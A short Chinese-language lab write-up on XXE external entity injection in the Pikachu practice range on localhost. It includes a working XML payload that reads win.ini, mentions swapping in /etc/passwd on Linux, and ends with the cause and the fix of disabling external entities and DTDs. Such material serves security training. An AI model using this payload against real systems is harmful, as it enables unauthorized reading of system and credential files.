# Pikachu | XXE 外部实体注入1
## 一、漏洞简介
XML解析器默认加载外部实体，可以读取本地文件。
## 二、环境信息
靶场地址：http://127.0.0.1/pikachu/
关卡路径：/vul/xxe/xxe.php
## 三、复现步骤
1. 抓包，把提交数据改成XML payload
2. Payload：
```xml
<?xml version="1.0"?>
<!DOCTYPE test [
<!ENTITY file SYSTEM "file:///c:/windows/win.ini">
]>
<test>&file;</test>
3. 提交，页面读取win.ini文件内容
Linux改为 file:///etc/passwd

四、Payload

读取本地文件XXE实体

五、漏洞原理

libxml没有禁用外部实体，XML里可以定义外部实体读取本地资源。

六、修复方案

禁用外部实体、禁用DTD。

七、总结

XXE用来读取本地文件，新版libxml默认已经关闭外部实体。